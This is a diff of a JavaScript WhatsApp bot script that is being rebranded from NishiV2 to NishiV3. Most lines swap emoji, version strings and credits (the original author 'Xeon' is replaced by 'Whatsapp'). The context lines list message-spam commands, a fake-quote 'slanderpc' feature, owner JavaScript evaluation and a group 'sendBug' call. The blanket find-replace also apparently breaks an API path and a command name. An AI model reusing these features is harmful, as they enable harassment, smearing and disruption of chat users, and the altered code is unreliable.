 break
+// ☠️ ${prefix}rentbot
+// ☠️ ${prefix}autoresponse
+// ☠️ ${prefix}clearall
+// ☠️ ${prefix}delchat
+// ☠️ ${prefix}mute
+// ☠️ ${prefix}unmute
+// ☠️ ${prefix}public
+// ☠️ ${prefix}listvn
+// ☠️ ${prefix}addsticker [reply sticker with caption]
+// ☠️ ${prefix}delsticker [sticker name]
+// ☠️ ${prefix}liststicker
+// ☠️ ${prefix}addimage [reply image with caption]
+// ☠️ ${prefix}delimage [image name]
+// ☠️ ${prefix}imagelist
+// ☠️ ${prefix}readall
+// ☠️ ${prefix}unreadall
+// ☠️ ${prefix}archive
+// ☠️ ${prefix}unarchiveall
+// ☠️ ${prefix}pin
+// ☠️ ${prefix}unpin
+// ☠️ ${prefix}offline [ reason ]
+// ☠️ ${prefix}restart
+// ☠️ ${prefix}addresponse [ ask|answer ]
+// ☠️ ${prefix}delresponse [ name ]
+// ☠️ ${prefix}listresponse
+// ☠️ ${prefix}addvn [reply audio with caption]
+// ☠️ ${prefix}delvn [vn name]
+// ☠️ ${prefix}online
+// ☠️ ${prefix}exif [ nama|author ]
+// ☠️ ${prefix}setprofile [ reply image ]
+// ☠️ ${prefix}setname [text]
+// ☠️ ${prefix}setprefix [ multi/nopref/prefix ]
+// ☠️ ${prefix}setbio [text]
+// ☠️ ${prefix}self
+// ☠️ ${prefix}return [ javascript ]
+// ☠️ ${prefix}spam [ text|amount ]
+// ☠️ ${prefix}tospam [ reply sticker|total ]
+// ☠️ ${prefix}demoteall
+// ☠️ ${prefix}promoteall
 case 'ownermenu':
 stamtus =`❏ 「 \`\`\`OWNER MENU\`\`\` 」
 ────────────────────
-🤤 ${prefix}rentbot
-🤤 ${prefix}autoresponse
-🤤 ${prefix}bc [ text ]
-🤤 ${prefix}tobc [ reply sticker/audio ]
-🤤 ${prefix}return [ javascript ]
-🤤 ${prefix}clearall
-🤤 ${prefix}delchat
-🤤 ${prefix}mute
-🤤 ${prefix}unmute
-🤤 ${prefix}public
-🤤 ${prefix}self
-🤤 ${prefix}spam [ text|amount ]
-🤤 ${prefix}tospam [ reply sticker|total ]
-🤤 ${prefix}demoteall
-🤤 ${prefix}promoteall
-🤤 ${prefix}addcmd [ reply text stc ]
-🤤 ${prefix}delcmd [ reply stc ]
-🤤 ${prefix}listcmd
-🤤 ${prefix}spamsw [ text|amount ]
-🤤 ${prefix}upswtext [text]
-🤤 ${prefix}upswloc [text]
-🤤 ${prefix}upswaudio [ reply audio ]
-🤤 ${prefix}upswvoice [ reply audio ]
-🤤 ${prefix}upswsticker [ reply sticker ]
-🤤 ${prefix}upswimage [ reply image ]
-🤤 ${prefix}upswgif [ reply gif ]
-🤤 ${prefix}upswvideo [ reply video ]
-🤤 ${prefix}shutdown
-🤤 ${prefix}offline [ reason ]
-🤤 ${prefix}online
-🤤 ${prefix}exif [ nama|author ]
-🤤 ${prefix}setprofile [ reply image ]
-🤤 ${prefix}setname [text]
-🤤 ${prefix}setprefix [ multi/nopref/prefix ]
-🤤 ${prefix}setbio [text]
-🤤 ${prefix}leave
-🤤 ${prefix}restart
-🤤 ${prefix}addresponse [ ask|answer ]
-🤤 ${prefix}delresponse [ name ]
-🤤 ${prefix}listresponse
-🤤 ${prefix}addvn [reply audio with caption]
-🤤 ${prefix}delvn [vn name]
-🤤 ${prefix}listvn
-🤤 ${prefix}addsticker [reply sticker with caption]
-🤤 ${prefix}delsticker [sticker name]
-🤤 ${prefix}liststicker
-🤤 ${prefix}addimage [reply image with caption]
-🤤 ${prefix}delimage [image name]
-🤤 ${prefix}imagelist
-🤤 ${prefix}readall
-🤤 ${prefix}unreadall
-🤤 ${prefix}archive
-🤤 ${prefix}unarchiveall
-🤤 ${prefix}pin
-🤤 ${prefix}unpin
-🤤 ${prefix}leavetime [ sec/min/hr ]
-🤤 ${prefix}opentime [ sec/min/hr ]
-🤤 ${prefix}closetime [ sec/min/hr ]
-🤤 ${prefix}nano [ filename ]
+
+☠️ ${prefix}bc [ text ]
+☠️ ${prefix}tobc [ reply sticker/audio ]
+☠️ ${prefix}addcmd [ reply text stc ]
+☠️ ${prefix}delcmd [ reply stc ]
+☠️ ${prefix}listcmd
+☠️ ${prefix}spamsw [ text|amount ]
+☠️ ${prefix}upswtext [text]
+☠️ ${prefix}upswloc [text]
+☠️ ${prefix}upswaudio [ reply audio ]
+☠️ ${prefix}upswvoice [ reply audio ]
+☠️ ${prefix}upswsticker [ reply sticker ]
+☠️ ${prefix}upswimage [ reply image ]
+☠️ ${prefix}upswgif [ reply gif ]
+☠️ ${prefix}upswvideo [ reply video ]
+☠️ ${prefix}shutdown
+☠️ ${prefix}leave
+☠️ ${prefix}leavetime [ sec/min/hr ]
+☠️ ${prefix}opentime [ sec/min/hr ]
+☠️ ${prefix}closetime [ sec/min/hr ]
+☠️ ${prefix}nano [ filename ]
 ────────────────────`
 buttons = [
 {buttonId:`sc`,buttonText:{displayText: 'Yo Boi'},type:1},
@@ -1835,7 +1843,7 @@ buttons = [
 ]
 const ownerM = {
     contentText: `${stamtus}`,
-    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Xeon_`,
+    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Whatsapp_`,
     buttons: buttons,
     headerType: 1
 }
@@ -1845,34 +1853,34 @@ case 'downloadmenu':
 case 'donwloadmenu':
 stamtus =`❏ 「 \`\`\`DOWNLOAD MENU\`\`\` 」
 ────────────────────
-🤤 ${prefix}herolist
-🤤 ${prefix}herodetail [ hero ]
-🤤 ${prefix}google [ search ]
-🤤 ${prefix}gimage [ search ]
-🤤 ${prefix}wiki [ search ] _indo_
-🤤 ${prefix}mediafire [ link ]
-🤤 ${prefix}facebook [ fb link ]
-🤤 ${prefix}facebook2 [ fb link ]
-🤤 ${prefix}twitter [ twitter video link ]
-🤤 ${prefix}twmp3 [ twitter video link ]
-🤤 ${prefix}twitter2 [ twitter video link ]
-🤤 ${prefix}ytmp4 [ yt link ]
-🤤 ${prefix}ytmp3 [ yt link ]
-🤤 ${prefix}play [ song title ]
-🤤 ${prefix}tiktok [ link ]
-🤤 ${prefix}video [ video title ]
-🤤 ${prefix}tinyurl [ link ]
-🤤 ${prefix}fetch [ link ]
-🤤 ${prefix}instagram [insta normal video link ]
-🤤 ${prefix}pinterest [ search ]
-🤤 ${prefix}lyrics [ title ]
-🤤 ${prefix}tourl [ reply image/video ]
-🤤 ${prefix}numbers [ number ]
-🤤 ${prefix}calculator [ number ]
-🤤 ${prefix}fancytext [text]
-🤤 ${prefix}githubstalk [ username ]
-🤤 ${prefix}translate [ code text ]
-🤤 ${prefix}ss [ link ]
+☠️ ${prefix}herolist
+☠️ ${prefix}herodetail [ hero ]
+☠️ ${prefix}google [ search ]
+☠️ ${prefix}gimage [ search ]
+☠️ ${prefix}wiki [ search ] _indo_
+☠️ ${prefix}mediafire [ link ]
+☠️ ${prefix}facebook [ fb link ]
+☠️ ${prefix}facebook2 [ fb link ]
+☠️ ${prefix}twitter [ twitter video link ]
+☠️ ${prefix}twmp3 [ twitter video link ]
+☠️ ${prefix}twitter2 [ twitter video link ]
+☠️ ${prefix}ytmp4 [ yt link ]
+☠️ ${prefix}ytmp3 [ yt link ]
+☠️ ${prefix}play [ song title ]
+☠️ ${prefix}tiktok [ link ]
+☠️ ${prefix}video [ video title ]
+☠️ ${prefix}tinyurl [ link ]
+☠️ ${prefix}fetch [ link ]
+☠️ ${prefix}instagram [insta normal video link ]
+☠️ ${prefix}pinterest [ search ]
+☠️ ${prefix}lyrics [ title ]
+☠️ ${prefix}tourl [ reply image/video ]
+☠️ ${prefix}numbers [ number ]
+☠️ ${prefix}calculator [ number ]
+☠️ ${prefix}fancytext [text]
+☠️ ${prefix}githubstalk [ username ]
+☠️ ${prefix}translate [ code text ]
+☠️ ${prefix}ss [ link ]
 ────────────────────`
 buttons = [
 {buttonId:`sc`,buttonText:{displayText: 'Yo Boi'},type:1},
@@ -1880,7 +1888,7 @@ buttons = [
 ]
 const downloadM = {
     contentText: `${stamtus}`,
-    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Xeon_`,
+    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Whatsapp_`,
     buttons: buttons,
     headerType: 1
 }
@@ -1891,33 +1899,33 @@ stamtus =`❏ 「 \`\`\`MAKER MENU\`\`\` 」
 ────────────────────
 _example: ${prefix}throne Nishi_
 ────────────────────
-🤤 ${prefix}write 「 text 」
-🤤 ${prefix}throne 「 text 」
-🤤 ${prefix}logoff 「 text 」
-🤤 ${prefix}cslogo 「 text 」
-🤤 ${prefix}matrix 「 text 」
-🤤 ${prefix}skytext 「 text 」
-🤤 ${prefix}barcode 「 text 」
-🤤 ${prefix}narutotxt 「 text 」
-🤤 ${prefix}bneon 「 text 」
-🤤 ${prefix}tfire 「 text 」
-🤤 ${prefix}light 「 text 」
-🤤 ${prefix}wall 「 text 」
-🤤 ${prefix}dropair 「 text 」
-🤤 ${prefix}wolf 「 text 」
-🤤 ${prefix}logocrs 「 text 」
-🤤 ${prefix}phlogo 「 text 」
-🤤 ${prefix}phcomment 「 *text|text 」
-🤤 ${prefix}pubg 「 text|text 」
-🤤 ${prefix}leavest 「 text 」
-🤤 ${prefix}notewrite 「 text 」
-🤤 ${prefix}neon2 「 text 」
-🤤 ${prefix}marvel 「 text|text 」
-🤤 ${prefix}logoa 「 text|text 」
-🤤 ${prefix}t3d 「 text 」
-🤤 ${prefix}flower 「 text 」
-🤤 ${prefix}gplay 「 text 」
-🤤 ${prefix}splay 「 text 」
+☠️ ${prefix}write 「 text 」
+☠️ ${prefix}throne 「 text 」
+☠️ ${prefix}logoff 「 text 」
+☠️ ${prefix}cslogo 「 text 」
+☠️ ${prefix}matrix 「 text 」
+☠️ ${prefix}skytext 「 text 」
+☠️ ${prefix}barcode 「 text 」
+☠️ ${prefix}narutotxt 「 text 」
+☠️ ${prefix}bneon 「 text 」
+☠️ ${prefix}tfire 「 text 」
+☠️ ${prefix}light 「 text 」
+☠️ ${prefix}wall 「 text 」
+☠️ ${prefix}dropair 「 text 」
+☠️ ${prefix}wolf 「 text 」
+☠️ ${prefix}logocrs 「 text 」
+☠️ ${prefix}phlogo 「 text 」
+☠️ ${prefix}phcomment 「 *text|text 」
+☠️ ${prefix}pubg 「 text|text 」
+☠️ ${prefix}leavest 「 text 」
+☠️ ${prefix}notewrite 「 text 」
+☠️ ${prefix}neon2 「 text 」
+☠️ ${prefix}marvel 「 text|text 」
+☠️ ${prefix}logoa 「 text|text 」
+☠️ ${prefix}t3d 「 text 」
+☠️ ${prefix}flower 「 text 」
+☠️ ${prefix}gplay 「 text 」
+☠️ ${prefix}splay 「 text 」
 ────────────────────`
 buttons = [
 {buttonId:`sc`,buttonText:{displayText: 'Yo Boi'},type:1},
@@ -1925,7 +1933,7 @@ buttons = [
 ]
 const makerM = {
     contentText: `${stamtus}`,
-    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Xeon_`,
+    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Whatsapp_`,
     buttons: buttons,
     headerType: 1
 }
@@ -1934,36 +1942,36 @@ break
 case 'othermenu':
 stamtus =`❏ 「 \`\`\`OTHER MENU\`\`\` 」
 ────────────────────
-🤤 ${prefix}searchmessage [ text|amount ]
-🤤 ${prefix}slots
-🤤 ${prefix}suit [ scissors/rock/paper ]
-🤤 ${prefix}tag [ number ]
-🤤 ${prefix}tagme
-🤤 ${prefix}tts [ code text ]
-🤤 ${prefix}readmore [ text1|text2 ]
-🤤 ${prefix}slanderpc [ number|text1|text2 ]
-🤤 ${prefix}chat [ number|text ]
-🤤 ${prefix}listgrup
-🤤 ${prefix}baileys [ reply message ]
-🤤 ${prefix}q [ reply message ]
-🤤 ${prefix}getcaption [ reply message ]
-🤤 ${prefix}shareloc [ text1|text2 ]
-🤤 ${prefix}sticker
-🤤 ${prefix}stcmeme [reply to sticker with text|text]
-🤤 ${prefix}stickerwm [ name|author ]
-🤤 ${prefix}takestick [ name|author ]
-🤤 ${prefix}dice
-🤤 ${prefix}semoji [ emoji ]
-🤤 ${prefix}attp [text]
-🤤 ${prefix}toimg
-🤤 ${prefix}tomp3 [ reply video ]
-🤤 ${prefix}tomp4 [ reply sticker gif ]
-🤤 ${prefix}robot [ reply audio ]
-🤤 ${prefix}reverse [ reply audio ]
-🤤 ${prefix}bass [ reply audio ]
-🤤 ${prefix}fat [ reply audio ]
-🤤 ${prefix}vnsec [ reply audio caption number ]
-🤤 ${prefix}vidsec [ reply video caption numbers ]
+☠️ ${prefix}searchmessage [ text|amount ]
+☠️ ${prefix}slots
+☠️ ${prefix}suit [ scissors/rock/paper ]
+☠️ ${prefix}tag [ number ]
+☠️ ${prefix}tagme
+☠️ ${prefix}tts [ code text ]
+☠️ ${prefix}readmore [ text1|text2 ]
+☠️ ${prefix}slanderpc [ number|text1|text2 ]
+☠️ ${prefix}chat [ number|text ]
+☠️ ${prefix}listgrup
+☠️ ${prefix}baileys [ reply message ]
+☠️ ${prefix}q [ reply message ]
+☠️ ${prefix}getcaption [ reply message ]
+☠️ ${prefix}shareloc [ text1|text2 ]
+☠️ ${prefix}sticker
+☠️ ${prefix}stcmeme [reply to sticker with text|text]
+☠️ ${prefix}stickerwm [ name|author ]
+☠️ ${prefix}takestick [ name|author ]
+☠️ ${prefix}dice
+☠️ ${prefix}semoji [ emoji ]
+☠️ ${prefix}attp [text]
+☠️ ${prefix}toimg
+☠️ ${prefix}tomp3 [ reply video ]
+☠️ ${prefix}tomp4 [ reply sticker gif ]
+☠️ ${prefix}robot [ reply audio ]
+☠️ ${prefix}reverse [ reply audio ]
+☠️ ${prefix}bass [ reply audio ]
+☠️ ${prefix}fat [ reply audio ]
+☠️ ${prefix}vnsec [ reply audio caption number ]
+☠️ ${prefix}vidsec [ reply video caption numbers ]
 ────────────────────`
 buttons = [
 {buttonId:`sc`,buttonText:{displayText: 'Yo Boi'},type:1},
@@ -1971,7 +1979,7 @@ buttons = [
 ]
 const otherM = {
     contentText: `${stamtus}`,
-    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Xeon_`,
+    footerText: `_This Bot was ReCoded By Nischal.. The Core Code Powered By Whatsapp_`,
     buttons: buttons,
     headerType: 1
 }
@@ -1984,11 +1992,11 @@ break
 
  listMsg = {
  buttonText: 'INTAKE LIST',
- footerText: 'NishiV2•Powered By Xeon',
+ footerText: 'NishiV3•Powered By Whatsapp',
  description: `Hi, Please select the intake menu here, use it wisely`,
  sections: [
                      {
-                      "title": `NishiV2`,
+                      "title": `NishiV3`,
  rows: [
                           {
                              "title": "randomgirl",
@@ -2193,7 +2201,7 @@ alpha.sendMessage(from, logocrs, image, { quoted:mek,caption:'Here you go' })
 break
                          case 'wolf':
                          if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
-                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Whatsapp*`)
                    F = body.slice(6)
                    reply(mess.wait)
                    anu = await getBuffer(`${ApiZeks}/api/wolflogo?apikey=${zeksApikey}&text1=zeeoneofc&text2=${F}`)
@@ -2201,7 +2209,7 @@ break
                    break
                           case 't3d':
                           if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
-                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Whatsapp*`)
                    F = body.slice(5)
                    reply(mess.wait)
                    anu = await getBuffer(`${ApiZeks}/api/text3dbox?apikey=${zeksApikey}&text=${F}`)
@@ -2209,7 +2217,7 @@ break
                    break
        case 'logoa':
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
-                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon&lol*`)
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Whatsapp&lol*`)
                    var F = body.slice(7)
 				   var F1 = F.split("|")[0];
 				   var F2 = F.split("|")[1];
@@ -2219,7 +2227,7 @@ break
                    break
        case 'phlogo':
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
-                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon&lol*`)
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Whatsapp&lol*`)
                    var F = body.slice(9)
 				   var F1 = F.split("|")[0];
 				   var F2 = F.split("|")[1];
@@ -2229,7 +2237,7 @@ break
                    break
        case 'marvel':
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
-                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon&lol*`)
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Whatsapp&lol*`)
                    var F = body.slice(8)
 				   var F1 = F.split("|")[0];
 				   var F2 = F.split("|")[1];
@@ -2239,7 +2247,7 @@ break
                    break
        case 'leavest':
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
-                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Whatsapp*`)
                    F = body.slice(9)
                    reply(mess.wait)
                    anu = await getBuffer(`${ApiZeks}/api/leavest?text=${F}&apikey=${zeksApikey}`)
@@ -2247,7 +2255,7 @@ break
                    break
        case 'notewrite':
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
-                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Whatsapp*`)
                    F = body.slice(7)
                    reply(mess.wait)
                    anu = await getBuffer(`${ApiZeks}/api/nulis?text=${F}&apikey=${zeksApikey}`)
@@ -2255,7 +2263,7 @@ break
                    break
        case 'neon2':
        if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
-                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Xeon*`)
+                   if (args.length < 1) return reply(`[  ×  ] Example :\n*${prefix}${command} Whatsapp*`)
                    F = body.slice(7)
                    reply(mess.wait)
                    anu = await getBuffer(`${ApiZeks}/api/bneon?apikey=${zeksApikey}&text=${F}`)
@@ -2317,7 +2325,7 @@ sticWait(from)
 cslogo = await getBuffer(`https://api.zeks.me/api/cslogo?text=${cslogo}&apikey=apivinz`)
 alpha.sendMessage(from, cslogo, image, { quoted:mek,caption:'Here you go' })
 break
-//nsfw by xeony workshop
+//nsfw by Nischaly workshop
 case 'nsfw':
 if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
 	        if (!isGroup) return reply('this feature is only for groups')
@@ -2370,7 +2378,7 @@ if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted
 if (!isGroup) return reply('this feature is only for groups')
 if (!isNsfw) return reply(`Nsfw feature is not yet active in this group\nType: ${prefix}nsfw 1 \To activate`)
 reply(mess.wait)
-anu = await fetchJson(`https://nekos.life/api/v2/img/blowjob`)
+anu = await fetchJson(`https://nekos.life/api/V3/img/blowjob`)
 buffer = await getBuffer(anu.url)
 alpha.sendMessage(from, buffer, image, { quoted: mek, thumbnail: fs.readFileSync('./nsfwdoge.jpg')})
 break
@@ -3135,7 +3143,7 @@ anu =`Please choose one below`
  buttons = [{buttonId: 'setmenu ori', buttonText: {displayText: 'ORI'}, type: 1},{buttonId: 'setmenu simple', buttonText: {displayText: 'SIMPLE'}, type: 1}]
 const skuygelud = {
     contentText: `${anu}`,
-    footerText: '*NishiV2•Powered By Xeon*',
+    footerText: '*NishiV3•Powered By Whatsapp*',
     buttons: buttons,
     headerType: 1
 }
@@ -3155,7 +3163,7 @@ anu =`Please choose one below`
  buttons = [{buttonId: 'setallmenu ori', buttonText: {displayText: 'ORI'}, type: 1},{buttonId: 'setallmenu simple', buttonText: {displayText: 'SIMPLE'}, type: 1}]
 const skuygf = {
     contentText: `${anu}`,
-    footerText: '*NishiV2•Powered By Xeon*',
+    footerText: '*NishiV3•Powered By Whatsapp*',
     buttons: buttons,
     headerType: 1
 }
@@ -3179,19 +3187,19 @@ case 'rentbot':
     reply(tekss)
     break
 case 'owner':
-	case 'creator':
+	case '🤘creator':
 case 'developer':
 		case 'author':
 let ini_list = []
 for (let i of ownerNumber) {
 const vname = alpha.contacts[i] != undefined ? alpha.contacts[i].vname || alpha.contacts[i].notify : undefined
 ini_list.push({
-"displayName": `NishiV2 Developer`,
+"displayName": `NishiV3 Developer`,
 "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;${NamaOwner};;;\nFN:${vname ? `${vname}` : `${NamaOwner}`}\nitem1.TEL;waid=${NomorOwner}:${NomorOwner2}\nitem1.X-ABLabel:Owner\nEND:VCARD`
 })
 }
 alpha.sendMessage(from, {
-"displayName": `NishiV2 Developer`,
+"displayName": `NishiV3 Developer`,
 "contacts": ini_list
 }, 'contactsArrayMessage', { quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true }})
 break
@@ -3229,11 +3237,11 @@ case 'sc':
 case 'script':
 case 'scbot':
 anu = `──────────────────
-NOTE : _DO NOT SELL BOT SCRIPT_
+Note : _Took Alota Time and Work..Mybe Donate 👉👈_
 ──────────────────
 *👇My LinkTree👇*
 https://linktr.ee/iamnishi
-_BASE : ReCoded By Nischal || Core Code by Xeon_
+_BASE : ReCoded By Nischal || Core Code by Whatsapp_
 _ORI SCRIPT : Nishi-Bot Version 2_
 _OWNER : ${NamaOwner}_
 ⍟ ────────────────── ⍟`
@@ -3274,7 +3282,7 @@ if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted
 "templateMessage": {
 						"hydratedTemplate": {
 							"hydratedContentText": `Hi ${pushname} 👋`,
-							"hydratedFooterText": `NishiV2•Powered By Xeon`,
+							"hydratedFooterText": `NishiV3•Powered By Whatsapp`,
 							"hydratedButtons": [
 								{
 									"quickReplyButton": {
@@ -3322,11 +3330,11 @@ if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted
   },
   "hydratedTemplate": {
     "hydratedContentText": `Hi ${pushname} 👋`,
-    "hydratedFooterText": `NishiV2`,
+    "hydratedFooterText": `NishiV3`,
     "hydratedButtons": [
       {
         "urlButton": {
-          "displayText": `NishiV2 Owner info`,
+          "displayText": `NishiV3 Owner info`,
           "url": "https://linktr.ee/iamnishi"
         },
         "index": 0
@@ -3533,7 +3541,7 @@ if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted
 const buttons = [{buttonId: 'autotyping on', buttonText: {displayText: 'ON✔️'}, type: 1},{buttonId: 'autotyping off', buttonText: {displayText: 'OFF✖️'}, type: 1}]
 const btnharam = {
     contentText: `${anu}`,
-    footerText: '*NishiV2*',
+    footerText: '*NishiV3*',
     buttons: buttons,
     headerType: 1
 }
@@ -3553,7 +3561,7 @@ await alpha.sendMessage(from, btnharam, MessageType.buttonsMessage, {quoted: fte
 const buttons = [{buttonId: 'antidelete on', buttonText: {displayText: 'ON✔️'}, type: 1},{buttonId: 'antidelete off', buttonText: {displayText: 'OFF✖️'}, type: 1}]
 const buttonMessage = {
     contentText: `${anu}`,
-    footerText: '*NishiV2*',
+    footerText: '*NishiV3*',
     buttons: buttons,
     headerType: 1
 }
@@ -3740,9 +3748,9 @@ if (args.length < 1) return reply('Where is the link? ')
 if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply(mess.error.api)
 if (Number(filesize) >= 30000) return reply(`*「 MEDIAFIRE DOWNLOAD 」*
 
-*🤤 Name :* ${res[0].nama}
-*🤤 Size :* ${res[0].size}
-*🤤 Link :* ${res[0].link}
+*☠️ Name :* ${res[0].nama}
+*☠️ Size :* ${res[0].size}
+*☠️ Link :* ${res[0].link}
 
 _Sorry the size exceeds the maximum limit, please click the link above_`)
 sticWait(from)
@@ -3751,9 +3759,9 @@ res = await mediafireDl(teks)
 result = `*「 DOWNLOAD MEDIAFIRE 」*
 
 *Data Successfully Obtained!*
-\`\`\`🤤 Name : ${res[0].nama}\`\`\`
-\`\`\`🤤 Size : ${res[0].size}\`\`\`
-\`\`\`🤤 Link : ${res[0].link}\`\`\`
+\`\`\`☠️ Name : ${res[0].nama}\`\`\`
+\`\`\`☠️ Size : ${res[0].size}\`\`\`
+\`\`\`☠️ Link : ${res[0].link}\`\`\`
 
 _The file is being sent, Please wait a few minutes_`
 reply(result)
@@ -4041,7 +4049,7 @@ encmediam = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.exten
 punten = [{buttonId: 'antivirtex off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'antivirtex on', buttonText: {displayText: 'ON✔️'}, type: 1}]
 const btnasu = {
     contentText: `${anu}`,
-    footerText: '*NishiV2*',
+    footerText: '*NishiV3*',
     buttons: punten,
     headerType: 1
 }
@@ -4070,7 +4078,7 @@ await alpha.sendMessage(from, btnasu, MessageType.buttonsMessage, {quoted: ftex}
 punten = [{buttonId: 'antiwame off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'antiwame on', buttonText: {displayText: 'ON✔️'}, type: 1}]
 const btnasu = {
     contentText: `${anu}`,
-    footerText: '*NishiV2*',
+    footerText: '*NishiV3*',
     buttons: punten,
     headerType: 1
 }
@@ -4099,7 +4107,7 @@ await alpha.sendMessage(from, btnasu, MessageType.buttonsMessage, {quoted: ftex}
 punten = [{buttonId: 'antilink off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'antilink on', buttonText: {displayText: 'ON✔️'}, type: 1}]
 const btnasu = {
     contentText: `${anu}`,
-    footerText: '*NishiV2*',
+    footerText: '*NishiV3*',
     buttons: punten,
     headerType: 1
 }
@@ -4124,7 +4132,7 @@ await alpha.sendMessage(from, btnasu, MessageType.buttonsMessage, {quoted: ftex}
 punten = [{buttonId: 'antibug off', buttonText: {displayText: 'OFF✖️'}, type: 1},{buttonId: 'antibug on', buttonText: {displayText: 'ON✔️'}, type: 1}]
 const btasu = {
     contentText: `${anu}`,
-    footerText: '*NishiV2*',
+    footerText: '*NishiV3*',
     buttons: punten,
     headerType: 1
 }
@@ -4350,10 +4358,10 @@ break
 					} else {
 						for (let _ of anu) {
 							//sendMess(_.jid, `${body.slice(4)}`)
-buttons = [{buttonId: `menu`, buttonText: {displayText: '🤤MENU🤤'}, type: 1},{buttonId: `owner`, buttonText: {displayText: '👤OWNER👤'}, type: 1}]
+buttons = [{buttonId: `menu`, buttonText: {displayText: '☠️MENU☠️'}, type: 1},{buttonId: `owner`, buttonText: {displayText: '👤OWNER👤'}, type: 1}]
 const btnbc = {
     contentText: `${body.slice(4)}`,
-    footerText: '*_NishiV2 BROADCAST_*',
+    footerText: '*_NishiV3 BROADCAST_*',
     buttons: buttons,
     headerType: 1
 }
@@ -4384,7 +4392,7 @@ if (args.length < 1) return reply('The text?')
 if (!isOwner && !mek.key.fromMe) return sticOwner(from)
   if (args.length < 1) return reply('The text?')
                     teks = body.slice(12)
-                    alpha.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`NishiV2`}, MessageType.location)
+                    alpha.sendMessage('status@broadcast', {degreesLatitude: 24.121231, degreesLongitude: 55.1121221, name:teks,address:`NishiV3`}, MessageType.location)
                     reply(`Successful uploading location:\n${teks}`)
                     break
                     case 'upswsticker':
@@ -4648,13 +4656,13 @@ break
             break
 				case 'attp':
               if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
-					if (!c) return reply(`Where is the text? Sis?\nExample :\n${prefix}attp NishiV2`)
+					if (!c) return reply(`Where is the text? Sis?\nExample :\n${prefix}attp NishiV3`)
 					atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(c)}`)
 					alpha.sendMessage(from, atetepe, sticker, { quoted: mek })
 					break
                 case 'ttp':
               if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
-                    if (!c) return reply(`Where is the text? Sis?\nExample :\n${prefix}attp NishiV2`)
+                    if (!c) return reply(`Where is the text? Sis?\nExample :\n${prefix}attp NishiV3`)
                     anu1 = await getBuffer(`https://api.xteam.xyz/ttp?file&text=${c}`)
                     alpha.sendMessage(from, anu1, image, {quoted: mek, caption : `${prefix}sticker`})
                     break
@@ -4877,7 +4885,7 @@ break
 				break
            case 'slanderpc':
               if (!isRegistered) return sendButRegis(from, daftar1, daftar2, daftar3, { quoted: mek})
-                if (args.length < 1) return reply(`Usage :\n${prefix}slanderpc [number|message|replybot]]\n\nEx : \n${prefix}slanderpc 0|hi|hi too xeon`)
+                if (args.length < 1) return reply(`Usage :\n${prefix}slanderpc [number|message|replybot]]\n\nEx : \n${prefix}slanderpc 0|hi|hi too Whatsapp`)
                 var gh = body.slice(10)
                 var parti = gh.split("|")[0];
                 var targetq = gh.split("|")[1];
@@ -4904,7 +4912,7 @@ break
 					teks = (args.length > 1) ? body.slice(8).trim() : ''
 					teks += '\n\n'
 					for (let mem of groupMembers) {
-						teks += `🤤 @${mem.jid.split('@')[0]}\n`
+						teks += `☠️ @${mem.jid.split('@')[0]}\n`
 						members_id.push(mem.jid)
 					}
 					mentions(teks, members_id, true)
@@ -4949,7 +4957,7 @@ break
               if (!isGroupAdmins) return sticAdmin(from)
               if (!isBotGroupAdmins) return sticNotAdmin(from)
               sendBug(from)
